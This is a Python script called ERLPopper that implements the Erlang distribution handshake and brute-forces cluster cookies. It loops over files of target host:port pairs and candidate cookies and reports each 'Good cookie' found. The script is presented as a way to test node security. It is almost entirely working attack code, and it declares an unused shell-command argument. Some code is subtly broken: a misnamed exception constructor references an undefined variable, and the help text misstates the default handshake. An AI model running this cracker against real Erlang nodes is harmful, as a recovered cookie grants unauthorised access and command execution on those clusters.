#!/usr/bin/env python3

from random import choice
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
from struct import pack, unpack
from string import ascii_uppercase
from hashlib import md5
from os.path import isfile
import argparse

class ERLPopper:
    UTF8    = "utf-8"


    class Error(Exception):
        pass

    class StatusError(Exception):
        def __init__(self, status, message):
            self.status = status
            self.message = message

    class VersionError(Exception):
        def __init(self, version, message):
            self.version = status
            self.message = message

    class EmptyResponseError(Exception):
        def __init__(self, message):
            self.message = message

    def __init__(self, target, cookie, version=6, challenge=None, cmd=None, verbose=False):
        (host, port) = target.split(':')
        self.remote_host = host
        self.remote_port = int(port)
        self.cookie = cookie
        self.challenge = challenge
        self.cmd = cmd
        self.version = version
        self._VERBOSE = verbose

        # Generate a node name to identify as
        self.node_name = self._generate_node_name()

        # Create a socket, die if none
        self._sock = socket(AF_INET, SOCK_STREAM, 0)
        assert(self._sock)

    def _log_verbose(self, data):
        if self._VERBOSE:
            print(f"[d] {data}")

    def _generate_node_name(self, n=6):
        '''
        Generate a node@host name for this instance.
        '''

        name = ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'

        self._log_verbose(f"Generated node name: '{repr(name)}'")
        
        return name

    def _connect(self):
        # Connect to target
        self._log_verbose(f"  Connecting to {self.remote_host}:{self.remote_port}")
        self._sock.connect((self.remote_host, self.remote_port))

    def _generate_name_packet_old(self, name=None):
        '''
        Old format:
        |--------|----|--------|----------------|-----------------------------------|
        |\x00\x10|'n' |\x00\x05|\x00\x03\x49\x9c|NAME@node ....                     |
        |--------|----|--------|----------------|-----------------------------------|
            |      |       |           |             |
            |      |       |           |             |-- our node name
            |      |       |           |
            |      |       |           |-- 32-bit capability flags bitfield:
            |      |       |           |--  See capability flags section below
            |      |       |
            |      |       |-- Version (always 5 for old format)
            |      |
            |      |-- Message tag ('n' for old format, 'N' for new)
            |
            |-- Message length set to 16 in this example for the length of the message that follows:
            |--   16 = 1 + 2 + 4 + len(node_name)
            |--   Does not include these 2 bytes

        New format:
        |--------|----|--------------------------------|--------|--------|----------|
        |\x00\x18|'N' |\x00\x00\x00\x00\x00\x03\x49\x9c|????    |\x00\x0e|NAME@node |
        |--------|----|--------------------------------|--------|--------|----------|
            |      |                 |                     |         |     |
            |      |                 |                     |         |     |-- our node name
            |      |                 |                     |         |
            |      |                 |                     |         |-- Nlen 16-bit length of node name
            |      |                 |                     |
            |      |                 |                     |-- Creation "is the node incarnation identifier
            |      |                 |                     |--   used by this node to create its PIDs, ports, 
            |      |                 |                     |--   and references.
            |      |                 |
            |      |                 |-- 64-bit capability flags bitfield
            |      |                 |--  See capability flags section below
            |      |
            |      |-- Message tag ('N' for new format)
            |
            |-- Message length set to 24 for the length of the message that follows:
            |--   24 = 1 + 8 + 4 + 2 + len(node_name)
            |--   Does not include these 2 bytes

        Capability flags / distribution flags
        http://erlang.org/doc/apps/erts/erl_dist_protocol.html#dflags

        This is how we let the other node know about our capabilities. This value 
        was in the original exploit.

        0x0003499c == 0b0000 0000 0011 0100 1001 1001 1100
                           |        ||  |   |  | |  | ||-- DFLAG_EXTENDED_REFERENCES
                           |        ||  |   |  | |  ||-- DFLAG_DIST_MONITOR
                           |        ||  |   |  | |  |-- DFLAG_FUN_TAGS
                           |        ||  |   |  | |-- DFLAG_NEW_FUN_TAGS 
                           |        ||  |   |  |-- DFLAG_EXTENDED_PIDS_PORTS 
                           |        ||  |   |-- DFLAG_NEW_FLOATS 
                           |        ||  |-- DFLAG_SMALL_ATOM_TAGS
                           |        ||-- DFLAG_UTF8_ATOMS
                           |        |-- DFLAG_MAP_TAG 
                           |-- DFLAG_HANDSHAKE_23

        Version 6 introduced the DFLAG_HANDSHAKE_23 which indicates this node 
        supports the OTP 23 handshake process. We must set this flag to show 
        we can do a handshake with newer nodes.

        Setting that bit gives our v6_flags value 0x0103499c.
        '''

        if not name:
            name = self.node_name

        #packet = pack('!HcHI', 7 + len(name), b'n', self.version, 0x3499c) + bytes(name, self.UTF8)
        packet = pack('!HcHI', 7 + len(name), b'n', self.version, 0xdf7fbd) + bytes(name, self.UTF8)

        return packet

    def _generate_name_packet_new(self, name=None):
        if not name:
            name = self.node_name

        #name = "maik@ubu-brute01-maik"
        packet = pack('!HcQIH', 15 + len(name), b'N', 0x103499c, 0xdeadbeef, len(name)) + bytes(name, self.UTF8)

        return packet

    def send_name(self, name=None):
        self._log_verbose("  send_name")

        if self.version == 5:
            packet = self._generate_name_packet_old(name)
        elif self.version == 6:
            packet = self._generate_name_packet_new(name)
        else:
            raise self.VersionError(version=self.version, message=f"Invalid version: '{repr(self.version)}")

        self._log_verbose(f"    Generated name packet: '{repr(packet)}'")

        try:
            self._sock.sendall(packet)
        except BrokenPipeError:
            self._log_verbose(f"    send_name failed. Is host reachable?")
            raise

    def _recv_status(self):
        '''
        recv_status
        '''
        self._log_verbose("  recv_status")

        # Receive 2 byte len
        msg_len = self._sock.recv(2)
        # Raise exception if empty
        if msg_len == b'':
            raise self.EmptyResponseError(message=f"Expected 2-byte integer length but got: '{repr(msg_len)}'")

        self._log_verbose(f"    Received msg_len: '{repr(msg_len)}'")

        msg_len = int.from_bytes(msg_len, "big")

        # Receive remainder of message
        data = self._sock.recv(msg_len)
        (tag, msg) = unpack(f'!c{msg_len-1}s', data[:msg_len])

        # We are expecting 's' tag
        assert(tag.decode(self.UTF8) == 's')

        msg = msg.decode(self.UTF8)

        self._log_verbose(f"    Received msg: '{repr(msg)}'")

        return msg

    def _recv_challenge(self):
        '''
        recv_challenge
        '''
        self._log_verbose("  recv_challenge")

        # Receive 2 byte len
        msg_len = self._sock.recv(2)
        self._log_verbose(f"    Received msg_len: '{repr(msg_len)}'")

        msg_len = int.from_bytes(msg_len, "big")

        # Receive remainder of message
        data = self._sock.recv(msg_len)
        # 1 + 2 + 4 + 4 = 11
        (tag, version, flags, challenge, name) = unpack(f'!cHII{msg_len-11}s', data[:msg_len])
        self._log_verbose(f"    Received tag: '{tag}', version: '{version}', flags: '{flags}', challenge: '{challenge}', name: '{name}'")
        
        # We are expecting 'n' tag
        assert(tag.decode(self.UTF8) == 'n')

        return challenge

    def _generate_challenge_reply_packet(self, challenge):
        m = md5()
        m.update(self.cookie.encode(self.UTF8))
        m.update(str(challenge).encode(self.UTF8))
        response = m.digest()
        self._log_verbose(f"    Generated digest: '{repr(response)}'")

        packet = pack('!HcI', len(response)+5, b'r', challenge) + response

        return packet

    def _send_challenge_reply(self, challenge):
        '''
        send_challenge_reply
        '''
        self._log_verbose("  send_challenge_reply")

        packet = self._generate_challenge_reply_packet(challenge)

        self._log_verbose(f"    Sending: {packet}")
        self._sock.sendall(packet)

    def _recv_challenge_ack(self):
        '''
        recv_challenge_ack
        '''
        self._log_verbose("  recv_challenge_ack")

        # Receive 2 byte len
        msg_len = self._sock.recv(2)
        self._log_verbose(f"    Received msg_len: '{repr(msg_len)}'")

        msg_len = int.from_bytes(msg_len, "big")

        # If the message returned doesn't include a digest then auth failed
        if msg_len < 17: # 1 + 16
            digest = False
        else:
            # Receive remainder of message
            data = self._sock.recv(msg_len)
            (tag, digest) = unpack(f'!c16s', data[:msg_len])
            self._log_verbose(f"    Received tag: '{tag}', digest: '{digest}'")

            # We are expecting 'a' tag
            assert(tag.decode(self.UTF8) == 'a')

        return digest
        
    def check_cookie(self, cookie=None):
        try:
            self._connect()
        except:
            pass

        if not cookie:
            cookie = self.cookie

        self._log_verbose(f"  Trying cookie: '{repr(cookie)}'")

        # send_name
        try:
            self.send_name()
        except self.VersionError as e:
            raise

        # recv_status
        try:
            status = self._recv_status()
        except self.EmptyResponseError as e:
            raise

        #if status == 'alive':
        #    self._send_status('true')
        #elif ...
        result = False
        if status == 'ok' or status == 'ok_simultaneous':
            self._log_verbose(f"    Got good status response: '{repr(status)}'")
            challenge = self._recv_challenge()
            
            # Not sure how useful this is
            if self.challenge:
                challenge = self.challenge

            self._send_challenge_reply(challenge)

            digest = self._recv_challenge_ack()

            result = (digest != False)
        else:
            # 'not_allowed' and others
            self._log_verbose(f"    Got bad status response: '{repr(status)}'")
            raise self.StatusError(status=status, message="The connection is disallowed for some (unspecified) security reason. Flags or version mismatch?")

        return result

def parse_str_or_file(in_str):
    '''
    Expecting:
        <string>
        - OR -
        <string_file>
    Where:
        <string> is a single item
        <string_file> is a newline-delimited list of <string>s
    '''

    list_lines = []
    if not isfile(in_str):
        list_lines = [in_str]
    else:
        list_lines = [x.strip() for x in open(in_str, 'r').readlines()]

    return list_lines

def main():
    # global VERBOSE

    #  [TODO] if args.target is file, parse host:port and add to host list

    # Parse args
    #  [TODO] allow input file for target
    #  [TODO] allow input file for cookie
    #  [TODO] implement custom argparse formatter for epilog
    parser = argparse.ArgumentParser(
            description='A script to test the security of Erlang nodes.',
            epilog='Example usage:  %(prog)s 127.0.0.1:12345 MYSECRETCOOKIE')

    parser.add_argument('target', action='store', type=parse_str_or_file, help='Target node <address>:<port>, or file containing newline-delimited list of <address>:<port> strings.')
    parser.add_argument('cookie', action='store', type=parse_str_or_file, help='Cluster cookie, or file containing newline-delimited list of <cookie> strings.')
    version_group = parser.add_mutually_exclusive_group()
    version_group.add_argument('--old', action='store_true', help='Use old handshake method.')
    version_group.add_argument('--new', action='store_true', help='Use new handshake method (default).')
    parser.add_argument('--verbose', action='store_true', help='Extra output for debugging.')
    parser.add_argument('--challenge', type=int, default=0, help='Set client challenge value.')
    parser.add_argument('cmd', default=None, nargs='?', action='store', type=str, help='Shell command to execute, defaults to interactive shell.')

    args = parser.parse_args()

    version = 5
    if args.new:
        version = 6

    for target in args.target:
        for cookie in args.cookie:
            epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=args.verbose, challenge=args.challenge, cmd=args.cmd)

            try:
                res = epop.check_cookie()
            except ERLPopper.StatusError as e:
                print(f"[E] Error status: '{repr(e.status)}', msg: '{e.message}'")
            except ERLPopper.EmptyResponseError as e:
                print(f"[E] Error response: '{e.message}'")
            except BrokenPipeError as e:
                print(f"[E] Broken pipe - is {target} up?")
            else:
                if res:
                    print(f"[+] Good cookie! Host: {target} Cookie: {cookie}")
                else:
                    if args.verbose: print("[-] Bad cookie!")

    #print(repr(data))

if __name__ == "__main__":
    main()
